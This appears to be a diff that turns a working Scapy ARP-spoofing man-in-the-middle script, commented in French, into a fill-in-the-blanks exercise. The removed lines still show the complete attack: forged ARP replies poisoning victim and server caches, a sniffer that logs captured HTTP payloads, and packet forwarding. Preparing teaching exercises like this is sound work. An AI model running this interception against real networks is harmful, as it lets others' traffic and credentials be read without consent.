@@ -49,28 +49,42 @@ def enable_ip_forwarding() -> None:
 
 
 def resolve_mac(target_ip: str, iface: str) -> str:
-    """Envoie des requêtes ARP who-has pour récupérer l'adresse MAC associée à l'IP ciblée sur l'interface donnée."""
+    """
+    ÉTAPE 1 : Résolution de l'adresse MAC d'une cible via ARP.
+
+    Envoie des requêtes ARP who-has pour récupérer l'adresse MAC associée à l'IP ciblée.
+
+    TODO : Compléter la construction du paquet ARP et l'extraction de la réponse.
+    """
     log(f"resolving MAC address for {target_ip}")
-    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)
+    # TODO: Créer un paquet Ether(dst="BROADCAST_MAC") / ARP(pdst=TARGET_IP)
+    packet = PACKET_ARP  # TODO: à compléter
     answered, _ = srp(packet, timeout=2, retry=3, iface=iface, verbose=0)
     for _, response in answered:
-        mac = response[Ether].src
+        mac = RESPONSE_MAC  # TODO: extraire la MAC depuis response[Ether].src
         log(f"MAC for {target_ip} is {mac}")
         return mac
     raise RuntimeError(f"Could not resolve MAC address for {target_ip}")
 
 
 def poison_arp(victim_mac: str, server_mac: str, attacker_mac: str) -> None:
-    """Diffuse en boucle deux réponses ARP falsifiées pour que victime et serveur me croient à l'autre bout."""
+    """
+    ÉTAPE 2 : Empoisonnement ARP bidirectionnel.
+
+    Diffuse en boucle deux réponses ARP falsifiées pour que victime et serveur
+    nous croient à l'autre bout.
+
+    TODO : Compléter les trames ARP falsifiées avec les bonnes IP sources (psrc).
+    """
     log("starting ARP poisoning loop")
+    # TODO: Compléter les champs psrc pour usurper les identités
     frame_to_victim = Ether(dst=victim_mac, src=attacker_mac) / ARP(
-        op=2, pdst=VICTIM_IP, hwdst=victim_mac, psrc=SERVER_IP, hwsrc=attacker_mac
+        op=2, pdst=VICTIM_IP, hwdst=victim_mac, psrc=SPOOFED_IP_FOR_VICTIM, hwsrc=attacker_mac  # TODO: quelle IP usurper ?
     )
     frame_to_server = Ether(dst=server_mac, src=attacker_mac) / ARP(
-        op=2, pdst=SERVER_IP, hwdst=server_mac, psrc=VICTIM_IP, hwsrc=attacker_mac
+        op=2, pdst=SERVER_IP, hwdst=server_mac, psrc=SPOOFED_IP_FOR_SERVER, hwsrc=attacker_mac  # TODO: quelle IP usurper ?
     )
     while not stop_event.is_set():
-        # J'ai envoyé les deux paquets régulièrement pour garder les caches ARP contaminés.
         sendp(frame_to_victim, verbose=0, iface=INTERFACE)
         sendp(frame_to_server, verbose=0, iface=INTERFACE)
         time.sleep(POISON_INTERVAL)
@@ -78,18 +92,25 @@ def poison_arp(victim_mac: str, server_mac: str, attacker_mac: str) -> None:
 
 
 def restore_arp(victim_mac: str, server_mac: str) -> None:
-    """Réémet des annonces ARP légitimes côté victime et serveur afin de rendre leurs caches cohérents avant de quitter."""
+    """
+    ÉTAPE 3 : Restauration des tables ARP légitimes.
+
+    Réémet des annonces ARP légitimes pour rendre les caches cohérents avant de quitter.
+
+    TODO : Compléter les adresses MAC sources (src et hwsrc) avec les VRAIES MACs.
+    """
+    # TODO: Compléter avec les vraies MACs
     sendp(
-        Ether(dst=victim_mac, src=server_mac)
-        / ARP(op=2, pdst=VICTIM_IP, hwdst=victim_mac, psrc=SERVER_IP, hwsrc=server_mac),
+        Ether(dst=victim_mac, src=REAL_SERVER_MAC)  # TODO: quelle MAC source ?
+        / ARP(op=2, pdst=VICTIM_IP, hwdst=victim_mac, psrc=SERVER_IP, hwsrc=REAL_SERVER_MAC),  # TODO: quelle MAC ?
         count=5,
         inter=0.2,
         verbose=0,
         iface=INTERFACE,
     )
     sendp(
-        Ether(dst=server_mac, src=victim_mac)
-        / ARP(op=2, pdst=SERVER_IP, hwdst=server_mac, psrc=VICTIM_IP, hwsrc=victim_mac),
+        Ether(dst=server_mac, src=REAL_VICTIM_MAC)  # TODO: quelle MAC source ?
+        / ARP(op=2, pdst=SERVER_IP, hwdst=server_mac, psrc=VICTIM_IP, hwsrc=REAL_VICTIM_MAC),  # TODO: quelle MAC ?
         count=5,
         inter=0.2,
         verbose=0,
@@ -105,7 +126,13 @@ def describe_payload(payload: bytes) -> str:
 
 
 def forward_packet(packet, victim_mac: str, server_mac: str, attacker_mac: str) -> None:
-    """Filtre les paquets IP MITM, logge les échanges HTTP et réexpédie la charge utile avec une entête Ethernet forgée."""
+    """
+    ÉTAPE 4 : Interception et transfert des paquets (MITM).
+
+    Filtre les paquets IP MITM, logge les échanges HTTP et réexpédie la charge utile.
+
+    TODO : Compléter la détermination de la direction et de la MAC de destination.
+    """
     if IP not in packet or Ether not in packet:
         return
     if packet[Ether].src == attacker_mac:
@@ -113,12 +140,13 @@ def forward_packet(packet, victim_mac: str, server_mac: str, attacker_mac: str) 
 
     direction: Optional[str] = None
     dst_mac: Optional[str] = None
-    if packet[IP].src == VICTIM_IP and packet[IP].dst == SERVER_IP:
+    # TODO: Compléter les conditions pour détecter la direction
+    if packet[IP].src == VICTIM_IP and packet[IP].dst == DESTINATION_IP:  # TODO: quelle IP ?
         direction = "victim->server"
-        dst_mac = server_mac
-    elif packet[IP].src == SERVER_IP and packet[IP].dst == VICTIM_IP:
+        dst_mac = DESTINATION_MAC  # TODO: vers quelle MAC envoyer ?
+    elif packet[IP].src == SOURCE_IP and packet[IP].dst == VICTIM_IP:  # TODO: quelle IP ?
         direction = "server->victim"
-        dst_mac = victim_mac
+        dst_mac = DESTINATION_MAC  # TODO: vers quelle MAC envoyer ?
 
     if not direction or not dst_mac:
         return
@@ -131,24 +159,31 @@ def forward_packet(packet, victim_mac: str, server_mac: str, attacker_mac: str) 
             payload_preview = describe_payload(packet[Raw].load)
             log(f"captured HTTP {direction} seq={packet[TCP].seq} data=\"{payload_preview}\"")
 
-    # J'ai repeint l'entête Ethernet pour que le paquet reparte vers la bonne cible.
-    new_packet = Ether(src=attacker_mac, dst=dst_mac) / packet[IP]
+    # TODO: Reconstruire la trame avec la bonne MAC de destination
+    new_packet = Ether(src=attacker_mac, dst=DST_MAC) / packet[IP]  # TODO: utiliser dst_mac
     sendp(new_packet, iface=INTERFACE, verbose=0)
 
 
 def sniff_packets(victim_mac: str, server_mac: str, attacker_mac: str) -> None:
-    """Démarre le sniffer Scapy sur l'interface et redirige chaque paquet pertinent vers le handler MITM."""
+    """
+    ÉTAPE 5 : Capture des paquets avec Scapy.
+
+    Démarre le sniffer Scapy et redirige chaque paquet vers le handler MITM.
+
+    TODO : Compléter le filtre BPF pour capturer uniquement le trafic victime↔serveur.
+    """
     log("starting packet sniffer")
 
     def handler(pkt):
         forward_packet(pkt, victim_mac, server_mac, attacker_mac)
 
+    # TODO: Compléter le filtre pour capturer les paquets entre VICTIM_IP et SERVER_IP
     sniff(
         iface=INTERFACE,
         prn=handler,
         store=False,
         stop_filter=lambda _: stop_event.is_set(),
-        filter=f"ip host {VICTIM_IP} and ip host {SERVER_IP}",
+        filter=BPF_FILTER,  # TODO: "ip host ... and ip host ..."
     )
 
 
